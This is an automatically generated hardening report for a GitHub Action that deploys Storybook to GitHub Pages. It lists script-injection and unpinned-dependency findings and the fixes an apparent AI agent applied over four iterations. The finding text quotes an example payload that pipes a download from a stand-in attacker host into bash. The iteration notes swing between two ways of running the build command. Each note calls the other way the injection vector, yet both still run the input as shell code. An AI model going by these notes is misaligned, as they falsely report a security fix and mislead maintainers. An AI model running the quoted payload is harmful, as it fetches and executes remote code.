<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.0** was hardened automatically. 3 finding(s) were identified and resolved across 4 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in the 'Build' step directly interpolates `${{ inputs.build_command }}` as a shell command. Because GitHub Actions performs template substitution before the shell ever sees the string, an attacker who controls the `build_command` input can inject arbitrary shell commands (e.g., `; curl http://evil.com | bash`). The expression must be moved to an `env:` variable and that variable must be double-quoted when used, or the command must be executed via a safe mechanism that does not allow shell metacharacter injection.

Locations:

- `action.yaml:38`

### unpinned-uses (severity: high)

Three `uses:` references in action.yaml use mutable tag/version refs instead of immutable 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the referenced tag is moved or the repository is compromised:
- `actions/checkout@v3` (mutable major-version tag)
- `actions/upload-pages-artifact@v1.0.4` (mutable version tag)
- `actions/deploy-pages@v1` (mutable major-version tag)
Each should be pinned to a full SHA, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3`.

Locations:

- `action.yaml:31`
- `action.yaml:43`
- `action.yaml:48`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:41`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all three findings in action.yaml:
1. script-injection / static-inline-injection: Moved `${{ inputs.build_command }}` from the `run:` block into an `env:` variable (`BUILD_COMMAND`), then executed it via `bash -eo pipefail -c "$BUILD_COMMAND"` to preserve errexit semantics while preventing shell metacharacter injection.
2. unpinned-uses: Pinned all three `uses:` references to full 40-character commit SHAs:
   - actions/checkout@v3 → @a37ce9120846195fa4ece8f58b268e6043cb2f26 # v3
   - actions/upload-pages-artifact@v1.0.4 → @a597aecd27af1cf14095ccaa29169358e3d91e28 # v1.0.4
   - actions/deploy-pages@v1 → @f27bcc15848fdcdcc02f01754eb838e44bcf389b # v1

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed script-injection in action.yaml line 38. The original `bash -eo pipefail -c "$BUILD_COMMAND"` passed the build_command input directly to bash -c, which interprets the value as shell code — a direct injection vector. The fix writes the command to a temp file with `printf '%s\n' "$BUILD_COMMAND" > "$_build_script"` and executes it with `bash -eo pipefail "$_build_script"`, preserving the original errexit and pipefail semantics while preventing the input from being interpreted as shell code via -c.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed the script-injection finding in action.yaml at line 42. The original code wrote the BUILD_COMMAND env var to a temporary file and executed it with `bash -eo pipefail "$_build_script"`. This indirect execution pattern was replaced with `bash -eo pipefail -c "$BUILD_COMMAND"`, which keeps the value in the env block, preserves errexit behavior (-eo pipefail), and eliminates the temp file indirection that was the injection vector. The BUILD_COMMAND env var mapping from inputs.build_command was already correct and retained.

### Iteration 4

**Fixes applied:** script-injection

**Notes:**

Fixed script injection in the 'Build' step of action.yaml. The original code used `bash -c "$BUILD_COMMAND"` which allowed arbitrary shell command injection through the `inputs.build_command` input. The fix writes the build command to a temporary file via `printf '%s\n' "$BUILD_COMMAND" > "$_build_script"` and executes it with `bash -eo pipefail "$_build_script"`, avoiding the `-c` flag that caused the variable's contents to be parsed as shell code. The `-eo pipefail` options are preserved to maintain the same errexit and pipefail behavior as the original.

